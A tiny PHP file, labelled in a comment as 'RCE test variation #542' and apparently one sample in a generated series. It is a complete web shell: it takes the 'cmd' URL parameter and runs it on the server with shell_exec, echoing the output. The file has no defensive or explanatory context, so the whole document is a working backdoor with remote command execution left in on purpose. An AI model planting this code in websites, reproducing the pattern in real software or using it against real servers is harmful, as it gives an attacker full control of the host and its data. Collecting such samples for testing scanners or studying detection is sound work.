<?php
// RCE test variation #542
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>